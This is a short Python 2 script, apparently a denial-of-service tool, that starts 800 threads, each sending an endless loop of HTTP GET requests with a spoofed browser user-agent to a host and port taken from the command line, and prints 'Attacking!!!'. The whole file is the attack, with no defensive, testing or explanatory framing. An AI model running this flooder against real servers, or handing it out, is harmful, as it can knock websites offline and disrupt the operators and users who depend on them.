import threading
import requests
import sys
thread_num = 800
def run():
    if len(sys.argv)>=3:
        host=sys.argv[1]
        port=sys.argv[2]
        url="http://"+host+":"+port
        headers={'user-agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"}
        print "Attacking!!!"
        while True:
            r = requests.get(url,headers=headers)
    else:
        print "It only work on HTTP server!!!"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()

